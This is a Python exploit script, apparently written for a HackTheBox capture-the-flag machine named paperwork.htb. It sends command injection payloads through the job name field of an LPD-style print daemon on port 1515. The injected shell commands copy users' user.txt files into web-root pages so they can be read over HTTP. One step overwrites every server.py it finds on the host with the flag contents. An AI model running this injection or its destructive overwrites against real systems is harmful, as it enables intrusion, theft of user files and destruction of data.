#!/usr/bin/env python3
"""Try writing flag to index.html or other web-accessible paths"""
import socket, time, urllib.request, os

TARGET = '10.129.38.158'

def lpd(jn, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{jn}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.5)
        s.recv(4096)
    except:
        pass
    s.close()

def get_page(path):
    req = urllib.request.Request(f'http://{TARGET}{path}', headers={'Host': 'paperwork.htb'})
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.read()
    except:
        return None

# Get reference index page
ref = get_page('/')
print(f"[0] Reference /: {len(ref)} bytes" if ref else "[0] No ref", flush=True)

# Get reference archive
ref_arc = get_page('/download/archive')
print(f"[0] Reference /download/archive: {len(ref_arc)} bytes" if ref_arc else "[0] No ref", flush=True)

MARKER = 'WROTE_' + os.urandom(4).hex()

# Method 1: Try to append flag to index.html at common paths
print("[1] Appending to index.html at various paths...", flush=True)
roots = [
    '/var/www/html/index.html',
    '/var/www/html/index.htm',
    '/usr/share/nginx/html/index.html',
    '/var/www/paperwork.htb/index.html',
    '/var/www/index.html',
    '/srv/http/index.html',
    '/opt/index.html',
    '/home/lp/index.html',
]
for r in roots:
    lpd(f"';cat /home/*/user.txt >> {r} 2>/dev/null; echo {MARKER} >> {r} 2>/dev/null;echo '")
    time.sleep(0.3)

time.sleep(2)

# Check if index page changed
data = get_page('/')
if data and data != ref:
    print(f"  / CHANGED! Was {len(ref)} now {len(data)} bytes", flush=True)
    decoded = data.decode(errors='replace')
    if MARKER in decoded:
        print(f"  *** FLAG IN INDEX!", flush=True)
        print(f"  Content: {decoded[len(ref):][:500]}", flush=True)
    import re
    flags = re.findall(r'HTB\{[^}]+\}', decoded)
    if flags:
        print(f"  *** FLAG: {flags[0]}", flush=True)
else:
    print(f"  / unchanged ({len(data)} bytes)", flush=True)

# Method 2: Try to ADD a new page to web roots
print("[2] Creating new pages at web roots...", flush=True)
loc = "NEW_PAGE_" + os.urandom(4).hex()
paths_to_create = [
    '/var/www/html/lpd_out',
    '/var/www/paperwork.htb/lpd_out',
    '/usr/share/nginx/html/lpd_out',
    '/opt/lpd_out',
]
for p in paths_to_create:
    lpd(f"';cat /home/*/user.txt > {p} 2>/dev/null; echo {loc} >> {p} 2>/dev/null;echo '")
    time.sleep(0.3)

time.sleep(2)
for check_path in ['/lpd_out', '/download/lpd_out', '/var/www/html/lpd_out']:
    data = get_page(check_path)
    if data:
        decoded = data.decode(errors='replace')
        if loc in decoded or 'HTB{' in decoded:
            print(f"  *** PAGE FOUND at {check_path}! {decoded[:200]}", flush=True)
            import re
            flags = re.findall(r'HTB\{[^}]+\}', decoded)
            if flags:
                print(f"  *** FLAG: {flags[0]}", flush=True)

# Method 3: Try to write to archive location directly (maybe it IS writable, just wrong path)
print("[3] Bruteforce find+overwrite for server.py...", flush=True)
# Use find to locate server.py, then for each copy the flag to it
# Also try to overwrite it with a modified version that returns flag in queue state
lpd("';find / -name server.py -not -path /proc/* 2>/dev/null | while read f; do cat /home/*/user.txt > \"$f\" 2>/dev/null; done;echo '")
time.sleep(1)

# Check if queue state changed (might return flag now)
s = socket.socket()
s.settimeout(5)
s.connect((TARGET, 1515))
s.send(b'\x03')
time.sleep(0.5)
data = s.recv(4096)
print(f"[3] Queue state: {data}", flush=True)
s.close()

# Method 4: Try to kill daemon and replace server.py, then query
# Actually let me try method 5 first - create a FIFO approach

print("DONE", flush=True)
